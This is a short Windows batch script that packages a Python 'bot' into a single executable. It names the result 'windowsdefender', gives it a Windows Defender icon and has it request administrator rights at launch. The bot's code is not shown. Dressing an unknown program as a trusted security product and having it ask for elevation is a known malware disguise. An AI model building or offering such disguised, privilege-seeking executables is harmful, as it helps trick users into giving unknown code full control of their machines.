@echo off
copy bot.pyw bot.py 
pyinstaller -F --uac-admin --distpath ./release/debug -i ./asset/windows_defender.ico -n windowsdefender bot.py
rm -rf ./build *.spec bot.py